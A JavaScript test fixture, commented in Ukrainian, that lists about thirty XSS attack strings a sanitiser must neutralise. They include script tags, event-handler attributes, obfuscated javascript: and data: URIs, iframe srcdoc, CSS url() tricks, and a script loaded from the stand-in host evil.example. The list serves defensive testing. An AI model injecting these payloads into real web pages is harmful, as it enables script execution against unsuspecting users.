/**
 * Вектори атаки: кожен мусить бути знешкоджений в обох профілях. Перевіряємо
 * не точний вивід, а відсутність виконуваного вмісту — тест не має ламатися від
 * зміни форми екранування.
 */
export const DANGEROUS = [
  '<script>alert(1)</script>',
  '<SCRIPT SRC=//evil.example/x.js></SCRIPT>',
  '<img src=x onerror=alert(1)>',
  '<img src="https://ok.example/a.png" onerror="alert(1)">',
  '<a href="javascript:alert(1)">x</a>',
  '<a href="  javascript:alert(1)">x</a>',
  '<a href="JaVaScRiPt:alert(1)">x</a>',
  '<a href="java\tscript:alert(1)">x</a>',
  '<a href="java&#x09;script:alert(1)">x</a>',
  '<a href="&#106;avascript:alert(1)">x</a>',
  '<a href="javascript&colon;alert(1)">x</a>',
  '<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">x</a>',
  '<a href="vbscript:msgbox(1)">x</a>',
  '<img src="data:image/svg+xml;base64,PHN2Zz48L3N2Zz4=">',
  '<img src="javascript:alert(1)">',
  '<svg onload=alert(1)></svg>',
  '<svg><script>alert(1)</script></svg>',
  '<iframe src="https://evil.example"></iframe>',
  '<iframe srcdoc="<script>alert(1)</script>"></iframe>',
  '<p style="background:url(javascript:alert(1))">x</p>',
  '<p style="text-align:center;background:url(javascript:alert(1))">x</p>',
  '<p onclick="alert(1)">x</p>',
  '<style>body{display:none}</style>',
  '<object data="x"></object><embed src="x">',
  '<form action="https://evil.example"><input name=p></form>',
  '<math><mi xlink:href="javascript:alert(1)">x</mi></math>',
  '<<script>alert(1)//<</script>',
  '<scr<script>ipt>alert(1)</scr</script>ipt>',
  '<p><b><i><a href="javascript:alert(1)">x</p></b>',
  '<a href="https://ok.example" onmouseover="alert(1)">x</a>',
  '<base href="javascript:alert(1)//">',
  '<meta http-equiv="refresh" content="0;url=javascript:alert(1)">',
];
